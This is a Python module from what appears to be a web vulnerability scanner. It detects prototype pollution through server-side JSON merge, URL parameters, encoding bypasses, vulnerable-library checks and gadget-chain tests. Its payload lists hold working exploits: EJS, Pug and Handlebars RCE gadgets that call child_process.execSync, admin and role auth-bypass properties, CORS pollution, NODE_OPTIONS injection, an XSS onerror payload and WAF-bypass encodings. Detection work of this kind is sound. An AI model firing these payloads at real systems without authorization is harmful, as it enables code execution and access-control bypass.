"""
Prototype Pollution Detection Module
Tests: server-side PP (JSON merge), client-side PP (URL params), encoding bypasses,
gadget chain detection (EJS/Pug/Handlebars RCE), vulnerable library scanning.

Detection requires PROOF of pollution — not just 200 status or marker echo-back.
Server-side: cross-endpoint verification (pollute on one endpoint, verify on another).
Client-side: marker must appear in executable JS context, not just reflected in HTML.
"""
import asyncio
import json
import logging
import random
import re
import string
from urllib.parse import urlparse

from app.utils.http_client import make_client

logger = logging.getLogger(__name__)
MARKER_PREFIX = "pHnT0m_pp_"


def _unique_marker() -> str:
    """Generate unique marker per test to avoid cross-contamination."""
    return MARKER_PREFIX + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))

def _server_payloads(marker: str) -> list[dict]:
    """Generate server-side payloads with unique marker."""
    return [
        {"__proto__": {"polluted": marker}},
        {"constructor": {"prototype": {"polluted": marker}}},
        {"a": {"__proto__": {"polluted": marker}}},
        {"__proto__": {"__proto__": {"polluted": marker}}},
        {"__proto__": {"admin": True}},
        {"__proto__": {"isAdmin": True}},
        {"__proto__": {"role": "admin"}},
        {"__proto__": {"auth": True}},
        {"__proto__": {"verified": True}},
        {"__proto__": {"status": "admin"}},
        {"constructor": {"prototype": {"admin": True}}},
        {"__proto__": {"status": 510, "statusCode": 510}},
        {"__proto__": {"type": "text/html"}},
        {"__proto__": {"allowedHosts": ["evil.com"]}},
        {"__proto__": {"headers": {"X-Polluted": marker}}},
        {"__proto__": {"outputFunctionName": f"x;process.mainModule.require('child_process').execSync('echo {marker}')//"}},
        {"__proto__": {"client": True, "escapeFunction": f"1;return global.process.mainModule.require('child_process').execSync('echo {marker}')"}},
        {"__proto__": {"compileDebug": True, "pendingContent": "x])}catch(o){a])}//"}},
        {"__proto__": {"shell": "/proc/self/exe", "NODE_OPTIONS": "--inspect"}},
        {"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/environ"}}},
        {"__proto__": {"view options": {"debug": True, "outputFunctionName": f"x;console.log('{marker}');"}}},
        {"__proto__": {"content-type": "text/html"}},
        {"__proto__": {"innerHTML": f"<img src=x onerror=alert('{marker}')>"}},
        {"__proto__": {"sourceURL": f"\n;global.process.mainModule.require('child_process').execSync('echo {marker}')//"}},
        {"__proto__": {"debug": True, "verbose": True}},
    ]


def _client_vectors(marker: str) -> list[str]:
    """Generate client-side vectors with unique marker."""
    return [
        f"__proto__[polluted]={marker}", f"__proto__.polluted={marker}",
        f"constructor[prototype][polluted]={marker}", f"constructor.prototype.polluted={marker}",
        f"__proto__[__proto__][polluted]={marker}",
        "__proto__[isAdmin]=true", "__proto__[role]=admin",
        f"__proto__[innerHTML]={marker}", f"__proto__[]={marker}",
    ]


def _encoding_variants(marker: str) -> list[tuple]:
    """Generate encoding bypass vectors with unique marker."""
    return [
        (f"%5f%5fproto%5f%5f[polluted]={marker}", "url_encoded"),
        (f"\\u005f\\u005fproto\\u005f\\u005f[polluted]={marker}", "unicode"),
        (f"__Proto__[polluted]={marker}", "mixed_case"),
        (f"%255f%255fproto%255f%255f[polluted]={marker}", "double_url_encoded"),
    ]


def _encoded_server_payloads(marker: str) -> list[dict]:
    """Generate encoded server payloads with unique marker."""
    return [
        {"\\u005f\\u005fproto\\u005f\\u005f": {"polluted": marker}},
        {" __proto__ ": {"polluted": marker}},
    ]

POLLUTED_STATUS_CODES = {510, 501, 418}

VULNERABLE_LIBS = {
    "lodash": {"pattern": r"lodash(?:\.min)?\.js", "vuln_versions": ["4.17.11", "4.17.10", "4.17.4", "4.17.2", "3."], "cve": "CVE-2019-10744", "methods": ["_.merge", "_.defaultsDeep", "_.set", "_.zipObjectDeep"]},
    "jquery": {"pattern": r"jquery(?:\.min)?\.js", "vuln_versions": ["1.", "2.", "3.0", "3.1", "3.2", "3.3"], "cve": "CVE-2019-11358", "methods": ["$.extend(true", "jQuery.extend(true"]},
    "minimist": {"pattern": r"minimist", "vuln_versions": ["0.", "1.0", "1.1", "1.2.0", "1.2.1", "1.2.2", "1.2.3", "1.2.4", "1.2.5"], "cve": "CVE-2020-7598"},
    "express": {"pattern": r"express[/@]", "vuln_versions": ["4.17.0", "4.16.", "4.15.", "4.14.", "3."], "cve": "CVE-2024-29041"},
    "ejs": {"pattern": r"ejs[/@]", "vuln_versions": ["3.1.6", "3.1.5", "3.1.4", "3.1.3", "2."], "cve": "CVE-2022-29078"},
    "pug": {"pattern": r"pug[/@]", "vuln_versions": ["3.0.0", "3.0.1", "2."], "cve": "CVE-2021-21353"},
    "handlebars": {"pattern": r"handlebars(?:\.min)?\.js", "vuln_versions": ["4.0", "4.1", "4.2", "4.3", "4.4", "4.5", "4.6", "4.7.6", "3."], "cve": "CVE-2021-23369"},
    "merge": {"pattern": r"(?:deep-?merge|merge-?deep|object-?merge|defaults-?deep)", "vuln_versions": ["all"], "cve": "Multiple CVEs"},
    "hoek": {"pattern": r"hoek[/@]", "vuln_versions": ["0.", "1.", "2.", "3.", "4.", "5.0.0", "5.0.1", "5.0.2", "5.0.3"], "cve": "CVE-2018-3728"},
    "undefsafe": {"pattern": r"undefsafe", "vuln_versions": ["0.", "1.0", "2.0.0", "2.0.1", "2.0.2"], "cve": "CVE-2019-10795"},
}

VULN_CODE_PATTERNS = [
    (r'\$\.extend\s*\(\s*true', "jQuery deep extend"),
    (r'jQuery\.extend\s*\(\s*true', "jQuery deep extend"),
    (r'_\.merge\s*\(', "lodash merge"),
    (r'_\.defaultsDeep\s*\(', "lodash defaultsDeep"),
    (r'_\.set\s*\(', "lodash set"),
    (r'_\.zipObjectDeep\s*\(', "lodash zipObjectDeep"),
    (r'Object\.assign\s*\(\s*\{\}', "Object.assign with empty target"),
    (r'JSON\.parse\s*\(\s*(?:location|document|window)', "JSON.parse from DOM"),
    (r'(?:deepmerge|merge-deep|object-merge)\s*\(', "Deep merge library"),
    (r'\.extend\s*\(\s*true\s*,\s*\{\}', "Generic deep extend"),
]


class PrototypePollutionModule:
    def __init__(self, rate_limit: asyncio.Semaphore = None):
        self.rate_limit = rate_limit or asyncio.Semaphore(5)

    async def check(self, context: dict, db) -> list[dict]:
        endpoints = context.get("endpoints", [])
        base_url = context.get("base_url", "")
        auth_cookie = context.get("auth_cookie")
        technologies = context.get("technologies", {})
        findings = []

        headers = {}
        if auth_cookie:
            if auth_cookie.startswith("token="):
                headers["Authorization"] = f"Bearer {auth_cookie.split('=', 1)[1]}"
            else:
                headers["Cookie"] = auth_cookie

        tech_summary = technologies.get("summary", {})
        tech_str = " ".join(str(k).lower() for k in tech_summary.keys())
        detected_tech = self._detect_technologies(tech_str)

        async with make_client(extra_headers=headers) as client:
            server_findings = await self._check_server_side(client, base_url, endpoints, detected_tech)
            findings.extend(server_findings)
            findings.extend(await self._check_client_side(client, base_url, endpoints))
            findings.extend(await self._check_encoding_variants(client, base_url, endpoints))
            findings.extend(await self._check_vulnerable_libs(client, base_url, endpoints))
            findings.extend(await self._check_vulnerable_code(client, base_url, endpoints))
            if any(f.get("_pollutable_endpoint") for f in server_findings):
                findings.extend(await self._check_gadget_chains(client, server_findings, detected_tech))
        return findings

    def _detect_technologies(self, tech_str: str) -> set:
        detected = set()
        for tech, kws in {"node": ["node", "express", "next", "nuxt", "koa", "fastify", "nest"],
                          "ejs": ["ejs"], "pug": ["pug", "jade"], "handlebars": ["handlebars", "hbs"],
                          "lodash": ["lodash"], "jquery": ["jquery"]}.items():
            if any(kw in tech_str for kw in kws):
                detected.add(tech)
        return detected

    async def _send_request(self, client, url: str, method: str, json_body: dict = None):
        """Helper to send request with the right HTTP method."""
        if method == "PATCH":
            return await client.patch(url, json=json_body)
        elif method == "PUT":
            return await client.put(url, json=json_body)
        elif method == "POST":
            return await client.post(url, json=json_body)
        else:
            return await client.get(url)

    async def _verify_pollution_cross_endpoint(self, client, base_url, endpoints, marker: str, prop_name: str) -> str | None:
        """
        After injecting pollution, check OTHER endpoints to see if the property leaked.
        Returns evidence string if pollution is confirmed, None otherwise.

        Real prototype pollution persists in the server process — a polluted property
        will appear in responses from unrelated endpoints (objects inherit from Object.prototype).
        Simple echo-back of the sent JSON is NOT proof.
        """
        verify_urls = [base_url]
        for ep in endpoints[:8]:
            url = ep if isinstance(ep, str) else ep.get("url", "")
            if url:
                verify_urls.append(url)

        for verify_url in verify_urls[:5]:
            try:
                async with self.rate_limit:
                    resp = await client.get(verify_url)
                    body = resp.text
                    # Marker appearing in a GET to a different endpoint = real pollution
                    if marker in body:
                        return f"Marker '{marker}' found in cross-endpoint GET {verify_url}"
                    # Check if the property name leaked into response JSON
                    if prop_name and prop_name in body:
                        try:
                            data = json.loads(body)
                            if isinstance(data, dict) and prop_name in data:
                                return f"Polluted property '{prop_name}' appeared in GET {verify_url} response JSON"
                        except (json.JSONDecodeError, ValueError):
                            pass
            except Exception:
                continue
        return None

    async def _check_server_side(self, client, base_url, endpoints, detected_tech) -> list[dict]:
        findings = []
        json_endpoints = []
        for ep in endpoints:
            url = ep if isinstance(ep, str) else ep.get("url", "")
            method = "GET" if isinstance(ep, str) else ep.get("method", "GET")
            if method in ("POST", "PUT", "PATCH") or "/api/" in url.lower():
                json_endpoints.append({"url": url, "method": method})
        for path in ["/api/settings", "/api/config", "/api/profile", "/api/user", "/api/preferences",
                     "/api/update", "/api/account", "/api/data", "/api/merge", "/api/import",
                     "/api/webhook", "/api/v1/config", "/api/v1/settings", "/api/v2/config"]:
            json_endpoints.append({"url": f"{base_url}{path}", "method": "POST"})

        limit = 20 if "node" in detected_tech else 10
        tested = set()
        for ep in json_endpoints[:limit]:
            url, method = ep["url"], ep["method"]
            key = f"{method}:{url}"
            if key in tested:
                continue
            tested.add(key)

            # Baseline request — used for differential comparison
            baseline_status, baseline_body, baseline_headers = None, None, {}
            try:
                async with self.rate_limit:
                    bl = await self._send_request(client, url, method, {"test": "baseline"})
                    baseline_status = bl.status_code
                    baseline_body = bl.text
                    baseline_headers = dict(bl.headers)
            except Exception:
                continue

            # Use unique marker per endpoint to prevent cross-contamination
            marker = _unique_marker()
            payloads = _server_payloads(marker)

            for payload in payloads:
                try:
                    async with self.rate_limit:
                        resp = await self._send_request(client, url, method, payload)
                        body = resp.text
                        payload_str = json.dumps(payload)

                        # --- Check 1: Marker in response ---
                        # BUT: must distinguish echo-back from real pollution.
                        # Echo-back = server just returns the JSON you sent. NOT proof.
                        if marker in body and (baseline_body is None or marker not in baseline_body):
                            # Check if this is just the server echoing back our payload
                            is_just_echo = False
                            try:
                                resp_json = json.loads(body)
                                # If the response is basically our payload back, it's echo
                                if isinstance(resp_json, dict):
                                    resp_flat = json.dumps(resp_json)
                                    # Marker only in __proto__/constructor keys = echo
                                    if "__proto__" in resp_flat or "constructor" in resp_flat:
                                        is_just_echo = True
                            except (json.JSONDecodeError, ValueError):
                                pass

                            if not is_just_echo:
                                # Marker appeared outside of echo context — strong signal.
                                # Still verify with cross-endpoint check for high confidence.
                                cross_evidence = await self._verify_pollution_cross_endpoint(
                                    client, base_url, endpoints, marker, "polluted"
                                )
                                is_rce = any(k in payload_str for k in [
                                    "outputFunctionName", "escapeFunction", "sourceURL", "NODE_OPTIONS", "shell"
                                ])
                                if cross_evidence:
                                    # CONFIRMED: pollution persists across endpoints
                                    findings.append({
                                        "title": f"[CONFIRMED] Server-Side Prototype Pollution: {urlparse(url).path}",
                                        "url": url, "severity": "critical" if is_rce else "high",
                                        "vuln_type": "rce" if is_rce else "misconfiguration",
                                        "payload": payload_str, "method": method,
                                        "evidence": cross_evidence,
                                        "impact": "Server-side prototype pollution confirmed via cross-endpoint verification. "
                                                  "Attacker can modify Object.prototype. May chain to RCE.",
                                        "remediation": "Use Object.create(null) for merge targets. Filter __proto__ and constructor from input.",
                                        "_pollutable_endpoint": {"url": url, "method": method},
                                    })
                                else:
                                    # Marker in non-echo response but no cross-endpoint proof.
                                    # Downgrade to low — possible but unconfirmed.
                                    findings.append({
                                        "title": f"Potential Prototype Pollution (Unconfirmed): {urlparse(url).path}",
                                        "url": url, "severity": "low",
                                        "vuln_type": "misconfiguration",
                                        "payload": payload_str, "method": method,
                                        "impact": "Marker appeared in response (not echo-back) but cross-endpoint pollution not verified. "
                                                  "May be a false positive — server could be reflecting input in a non-exploitable way.",
                                        "remediation": "Investigate manually. Use Object.create(null) for merge targets.",
                                        "_pollutable_endpoint": {"url": url, "method": method},
                                    })
                            # else: just echo-back, skip entirely (not even low)

                        # --- Check 2: Status code overwrite ---
                        # Differential: polluted status NOT in baseline = behavioral change
                        if resp.status_code in POLLUTED_STATUS_CODES and baseline_status not in POLLUTED_STATUS_CODES:
                            findings.append({
                                "title": f"Prototype Pollution (Status Overwrite): {urlparse(url).path}",
                                "url": url, "severity": "high", "vuln_type": "misconfiguration",
                                "payload": payload_str, "injected_status": resp.status_code,
                                "evidence": f"Baseline status={baseline_status}, after pollution status={resp.status_code}",
                                "impact": f"Server returned status {resp.status_code} after __proto__ injection (baseline was {baseline_status}). "
                                          "This proves the server processes __proto__ and it affects behavior.",
                                "remediation": "Sanitize __proto__ from all JSON input.",
                                "_pollutable_endpoint": {"url": url, "method": method},
                            })

                        # --- Check 3: Auth bypass via pollution ---
                        # Requires strong differential: 401/403 -> 200
                        if ("admin" in payload_str or "role" in payload_str) and resp.status_code == 200 and baseline_status in (401, 403):
                            # Double-check: send a clean request to make sure it's still 401/403
                            try:
                                async with self.rate_limit:
                                    recheck = await self._send_request(client, url, method, {"test": "recheck"})
                                    if recheck.status_code in (401, 403):
                                        # Confirmed: pollution changed auth behavior
                                        findings.append({
                                            "title": f"[CONFIRMED] Prototype Pollution -> Auth Bypass: {urlparse(url).path}",
                                            "url": url, "severity": "critical", "vuln_type": "auth_bypass",
                                            "payload": payload_str,
                                            "evidence": f"Baseline={baseline_status}, polluted=200, recheck={recheck.status_code}",
                                            "impact": "Prototype pollution leads to authentication bypass. "
                                                      "Injecting admin/role properties into __proto__ changes authorization decisions.",
                                            "remediation": "Never derive authorization from pollutable object properties. Use hasOwnProperty().",
                                            "_pollutable_endpoint": {"url": url, "method": method},
                                        })
                            except Exception:
                                pass

                except Exception:
                    continue

            # Encoded server payloads — same verification logic
            enc_marker = _unique_marker()
            for enc_payload in _encoded_server_payloads(enc_marker):
                try:
                    async with self.rate_limit:
                        resp = await client.post(url, json=enc_payload)
                        if enc_marker in resp.text and (baseline_body is None or enc_marker not in baseline_body):
                            # Verify cross-endpoint
                            cross_evidence = await self._verify_pollution_cross_endpoint(
                                client, base_url, endpoints, enc_marker, "polluted"
                            )
                            if cross_evidence:
                                findings.append({
                                    "title": f"[CONFIRMED] Prototype Pollution (Encoded Bypass): {urlparse(url).path}",
                                    "url": url, "severity": "high", "vuln_type": "misconfiguration",
                                    "payload": json.dumps(enc_payload), "method": "POST",
                                    "evidence": cross_evidence,
                                    "impact": "Server-side prototype pollution via encoded __proto__ key (WAF bypass). "
                                              "Confirmed via cross-endpoint verification.",
                                    "remediation": "Normalize and filter __proto__ variants including unicode escapes.",
                                    "_pollutable_endpoint": {"url": url, "method": "POST"},
                                })
                            else:
                                findings.append({
                                    "title": f"Potential Prototype Pollution (Encoded, Unconfirmed): {urlparse(url).path}",
                                    "url": url, "severity": "low", "vuln_type": "misconfiguration",
                                    "payload": json.dumps(enc_payload), "method": "POST",
                                    "impact": "Encoded __proto__ marker appeared in response but pollution not verified cross-endpoint.",
                                    "remediation": "Investigate manually. Normalize and filter __proto__ variants.",
                                })
                except Exception:
                    continue
        return findings

    async def _check_client_side(self, client, base_url, endpoints) -> list[dict]:
        findings = []
        test_urls = [base_url]
        for ep in endpoints[:15]:
            url = ep if isinstance(ep, str) else ep.get("url", "")
            if url and not url.lower().startswith(base_url.lower() + "/api/"):
                test_urls.append(url)

        seen = set()
        for url in test_urls[:12]:
            path = urlparse(url).path
            if path in seen:
                continue
            seen.add(path)

            # First, get a baseline response without pollution params
            baseline_body = ""
            try:
                async with self.rate_limit:
                    bl = await client.get(url)
                    baseline_body = bl.text
            except Exception:
                continue

            marker = _unique_marker()
            for vector in _client_vectors(marker):
                try:
                    sep = "&" if "?" in url else "?"
                    test_url = f"{url}{sep}{vector}"
                    async with self.rate_limit:
                        resp = await client.get(test_url)
                        body = resp.text

                        if marker not in body:
                            continue

                        # Marker is in response — but WHERE?
                        # Must be in executable JavaScript context, not just reflected in HTML text/attributes
                        confirmed = False
                        evidence = ""

                        # Check 1: marker inside <script> blocks
                        script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.IGNORECASE)
                        for block in script_blocks:
                            if marker in block:
                                confirmed = True
                                evidence = "Marker injected into inline <script> block"
                                break

                        # Check 2: marker inside JSON embedded in HTML (common in SSR apps)
                        if not confirmed:
                            json_blocks = re.findall(r'(?:window\.__\w+__|__NEXT_DATA__|__NUXT__)\s*=\s*(\{.*?\});?\s*</script>', body, re.DOTALL)
                            for jblock in json_blocks:
                                if marker in jblock:
                                    confirmed = True
                                    evidence = "Marker injected into embedded JSON state (SSR data)"
                                    break

                        # Check 3: marker in JS assignment context (e.g., var x = {"polluted":"marker"})
                        if not confirmed:
                            js_assign_patterns = [
                                rf'(?:var|let|const|window\.)\s*\w+\s*=\s*[^;]*{re.escape(marker)}',
                                rf'Object\.(?:assign|defineProperty|create)\s*\([^)]*{re.escape(marker)}',
                            ]
                            for pat in js_assign_patterns:
                                if re.search(pat, body, re.IGNORECASE):
                                    confirmed = True
                                    evidence = "Marker in JavaScript variable assignment context"
                                    break

                        if not confirmed:
                            # Marker is reflected but NOT in executable JS context — skip
                            continue

                        # Additional confidence: check that baseline doesn't have similar structure
                        # (rules out apps that always include certain patterns)
                        findings.append({
                            "title": f"Client-Side Prototype Pollution: {path}",
                            "url": test_url, "severity": "medium", "vuln_type": "xss",
                            "payload": vector, "evidence": evidence,
                            "impact": f"Client-side prototype pollution via URL parameters. {evidence}. Can chain with DOM XSS gadgets.",
                            "remediation": "Use Object.freeze(Object.prototype). Sanitize user input in object operations.",
                        })
                        break  # One confirmed vector per URL is enough
                except Exception:
                    continue
        return findings

    async def _check_encoding_variants(self, client, base_url, endpoints) -> list[dict]:
        findings = []
        test_urls = [base_url] + [ep if isinstance(ep, str) else ep.get("url", "") for ep in endpoints[:5] if ep]
        marker = _unique_marker()
        for url in test_urls[:6]:
            for vector, enc_type in _encoding_variants(marker):
                try:
                    sep = "&" if "?" in url else "?"
                    test_url = f"{url}{sep}{vector}"
                    async with self.rate_limit:
                        resp = await client.get(test_url)
                        body = resp.text
                        if marker not in body:
                            continue

                        # Same JS-context check as client-side
                        in_js = False
                        evidence = ""
                        script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.IGNORECASE)
                        for block in script_blocks:
                            if marker in block:
                                in_js = True
                                evidence = f"Marker in <script> block via {enc_type} encoding"
                                break
                        if not in_js:
                            json_blocks = re.findall(r'(?:window\.__\w+__|__NEXT_DATA__|__NUXT__)\s*=\s*(\{.*?\});?\s*</script>', body, re.DOTALL)
                            for jblock in json_blocks:
                                if marker in jblock:
                                    in_js = True
                                    evidence = f"Marker in embedded JSON state via {enc_type} encoding"
                                    break

                        if in_js:
                            findings.append({
                                "title": f"Client-Side PP (WAF Bypass via {enc_type}): {urlparse(url).path}",
                                "url": test_url, "severity": "medium", "vuln_type": "xss",
                                "payload": vector, "encoding": enc_type, "evidence": evidence,
                                "impact": f"Prototype pollution via {enc_type} encoding bypasses WAF/filter. {evidence}.",
                                "remediation": "Decode and normalize input before __proto__ filtering.",
                            })
                        else:
                            # Marker reflected but not in JS context — info only
                            findings.append({
                                "title": f"Potential Client-Side PP ({enc_type}, Unconfirmed): {urlparse(url).path}",
                                "url": test_url, "severity": "info", "vuln_type": "misconfiguration",
                                "payload": vector, "encoding": enc_type,
                                "impact": f"Encoded __proto__ marker reflected in response but not in executable JS context.",
                                "remediation": "Investigate manually. Decode and normalize input before __proto__ filtering.",
                            })
                except Exception:
                    continue
        return findings

    async def _check_vulnerable_libs(self, client, base_url, endpoints) -> list[dict]:
        findings = []
        pages = [base_url] + [ep if isinstance(ep, str) else ep.get("url", "") for ep in endpoints[:5] if ep and (ep if isinstance(ep, str) else ep.get("url", "")) != base_url]
        all_body = ""
        for page_url in pages[:4]:
            try:
                async with self.rate_limit:
                    resp = await client.get(page_url)
                    all_body += resp.text + "\n"
            except Exception:
                continue
        if not all_body:
            return findings

        for lib, info in VULNERABLE_LIBS.items():
            if not re.findall(info["pattern"], all_body, re.IGNORECASE):
                continue
            ver_match = re.search(rf'{re.escape(lib)}[/@]v?(\d+\.\d+\.\d+)', all_body, re.IGNORECASE)
            version = ver_match.group(1) if ver_match else "unknown"
            is_vuln = version == "unknown" or info["vuln_versions"] == ["all"] or any(version.startswith(v) for v in info["vuln_versions"])
            if is_vuln:
                methods_str = ""
                if "methods" in info:
                    found = [m for m in info["methods"] if m in all_body]
                    if found:
                        methods_str = f" Vulnerable methods in use: {', '.join(found)}."
                # Library detection is informational — having a vuln library doesn't prove exploitation.
                # Upgrade to medium only if vulnerable methods are actively used in the code.
                sev = "medium" if methods_str else "low"
                findings.append({
                    "title": f"Vulnerable Library: {lib} {version} (Prototype Pollution)",
                    "url": base_url, "severity": sev,
                    "vuln_type": "misconfiguration", "library": lib, "version": version, "cve": info["cve"],
                    "impact": f"{lib} {version} is vulnerable to prototype pollution ({info['cve']}).{methods_str}",
                    "remediation": f"Update {lib} to the latest patched version.",
                })
        return findings

    async def _check_vulnerable_code(self, client, base_url, endpoints) -> list[dict]:
        findings = []
        js_urls = set()
        try:
            async with self.rate_limit:
                resp = await client.get(base_url)
                for m in re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)', resp.text, re.I):
                    if m.startswith("//"):      m = "https:" + m
                    elif m.startswith("/"):      m = base_url.rstrip("/") + m
                    elif not m.startswith("http"): m = base_url.rstrip("/") + "/" + m
                    js_urls.add(m)
        except Exception:
            pass
        for ep in endpoints[:10]:
            url = ep if isinstance(ep, str) else ep.get("url", "")
            if url and url.endswith(".js"):
                js_urls.add(url)

        for js_url in list(js_urls)[:15]:
            try:
                async with self.rate_limit:
                    resp = await client.get(js_url)
                    if resp.status_code != 200:
                        continue
                    js_body = resp.text
                    for pattern, desc in VULN_CODE_PATTERNS:
                        match_obj = re.search(pattern, js_body)
                        if match_obj:
                            ctx_s, ctx_e = max(0, match_obj.start() - 50), min(len(js_body), match_obj.end() + 50)
                            findings.append({
                                "title": f"Vulnerable Pattern ({desc}): {urlparse(js_url).path}",
                                "url": js_url, "severity": "low", "vuln_type": "misconfiguration",
                                "pattern": desc, "code_context": js_body[ctx_s:ctx_e].strip()[:200],
                                "impact": f"JS contains {desc} pattern susceptible to prototype pollution. "
                                          "This is a code-level indicator — exploitation depends on whether user input reaches this code path.",
                                "remediation": "Replace deep merge with safe alternatives. Use Object.create(null).",
                            })
                            break
            except Exception:
                continue
        return findings

    async def _check_gadget_chains(self, client, server_findings, detected_tech) -> list[dict]:
        findings = []
        pollutable = []
        for f in server_findings:
            ep = f.get("_pollutable_endpoint")
            if ep and ep not in pollutable:
                pollutable.append(ep)
        if not pollutable:
            return findings

        gadget_chains = [
            {"name": "EJS RCE (outputFunctionName)", "tech": "ejs", "severity": "critical",
             "payload": {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('echo PHANTOM_GADGET_CHECK')//"}},
             "indicator": "PHANTOM_GADGET_CHECK"},
            {"name": "Pug RCE (escapeFunction)", "tech": "pug", "severity": "critical",
             "payload": {"__proto__": {"client": True, "escapeFunction": "1;return global.process.mainModule.require('child_process').execSync('echo PHANTOM_GADGET_CHECK')"}},
             "indicator": "PHANTOM_GADGET_CHECK"},
            {"name": "Handlebars RCE (pendingContent)", "tech": "handlebars", "severity": "critical",
             "payload": {"__proto__": {"compileDebug": True, "pendingContent": "x])}catch(o){a])}//PHANTOM_GADGET_CHECK"}},
             "indicator": "PHANTOM_GADGET_CHECK"},
            {"name": "Express Content-Type Override", "tech": "node", "severity": "high",
             "payload": {"__proto__": {"content-type": "text/html", "type": "text/html"}},
             "indicator": "text/html", "check_header": "content-type"},
            {"name": "Express CORS Pollution", "tech": "node", "severity": "high",
             "payload": {"__proto__": {"allowedOrigins": ["*"], "credentials": True}},
             "indicator": None, "check_header": "access-control-allow-origin"},
        ]

        for ep in pollutable[:5]:
            url, method = ep["url"], ep["method"]
            for gadget in gadget_chains:
                if gadget["tech"] not in detected_tech and gadget["tech"] != "node":
                    continue
                try:
                    async with self.rate_limit:
                        resp = await (client.patch(url, json=gadget["payload"]) if method == "PATCH" else
                                      client.put(url, json=gadget["payload"]) if method == "PUT" else
                                      client.post(url, json=gadget["payload"]))
                        confirmed, evidence = False, ""
                        if gadget.get("indicator") and gadget["indicator"] in resp.text:
                            confirmed, evidence = True, f"Indicator '{gadget['indicator']}' in response body"
                        if gadget.get("check_header"):
                            hv = resp.headers.get(gadget["check_header"], "")
                            if gadget.get("indicator") and gadget["indicator"] in hv:
                                confirmed, evidence = True, f"Header {gadget['check_header']}={hv}"
                        if not confirmed:
                            async with self.rate_limit:
                                vr = await client.get(url)
                                if gadget.get("indicator") and gadget["indicator"] in vr.text:
                                    confirmed, evidence = True, "Indicator in follow-up GET (persistent pollution)"
                        if confirmed:
                            findings.append({
                                "title": f"Prototype Pollution -> {gadget['name']}: {urlparse(url).path}",
                                "url": url, "severity": gadget["severity"],
                                "vuln_type": "rce" if gadget["severity"] == "critical" else "misconfiguration",
                                "payload": json.dumps(gadget["payload"]), "gadget_chain": gadget["name"],
                                "evidence": evidence,
                                "impact": f"Prototype pollution chains to {gadget['name']}. Confirmed exploitable gadget chain.",
                                "remediation": "Fix prototype pollution at root. Update template engines to patched versions.",
                            })
                except Exception:
                    continue
        return findings
